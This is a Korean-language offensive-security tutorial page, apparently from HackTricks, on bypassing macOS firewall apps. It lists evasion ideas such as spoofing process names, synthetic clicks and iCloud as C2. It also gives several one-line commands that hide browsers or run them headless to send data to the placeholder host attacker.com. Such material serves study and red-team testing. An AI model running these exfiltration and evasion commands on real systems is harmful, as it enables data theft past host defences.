# macOS 방화벽 우회

{% hint style="success" %}
AWS 해킹 학습 및 실습:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* 해킹 팁을 공유하려면 **HackTricks** 및 **HackTricks Cloud** 깃허브 저장소에 PR을 제출하세요.

</details>
{% endhint %}

## 발견된 기술

다음 기술은 일부 macOS 방화벽 앱에서 작동하는 것으로 확인되었습니다.

### 화이트리스트 이름 남용

* 예를 들어 악성 코드를 **`launchd`**와 같은 잘 알려진 macOS 프로세스 이름으로 부르기

### 합성 클릭

* 방화벽이 사용자에게 허가를 요청하면 악성 코드가 **허용을 클릭**하도록 함

### **Apple 서명된 이진 파일 사용**

* **`curl`**과 같은 것뿐만 아니라 **`whois`**와 같은 다른 이진 파일도 사용

### 잘 알려진 애플 도메인

방화벽이 **`apple.com`** 또는 **`icloud.com`**과 같은 잘 알려진 애플 도메인으로의 연결을 허용할 수 있습니다. 그리고 iCloud를 C2로 사용할 수 있습니다.

### 일반적인 우회

방화벽 우회를 시도하는 몇 가지 아이디어

### 허용된 트래픽 확인

허용된 트래픽을 알면 잠재적으로 화이트리스트에 등록된 도메인이나 해당 도메인에 액세스할 수 있는 애플리케이션을 식별하는 데 도움이 됩니다.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS 남용

DNS 해결은 아마도 DNS 서버에 연락할 수 있도록 허용될 것으로 예상되는 **`mdnsreponder`** 서명된 애플리케이션을 통해 수행됩니다.

<figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### 브라우저 앱을 통해

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* 구글 크롬

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* 파이어폭스
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
* Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### 프로세스 인젝션을 통해

만약 **프로세스에 코드를 인젝션**할 수 있다면, 어떤 서버에 연결할 수 있는 권한을 가진 프로세스로 방화벽 보호를 우회할 수 있습니다:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## 참고 자료

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{% hint style="success" %}
AWS 해킹 학습 및 실습:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 학습 및 실습: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* 💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* 해킹 트릭을 공유하려면 [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃헙 레포지토리에 PR을 제출하세요.

</details>
{% endhint %}
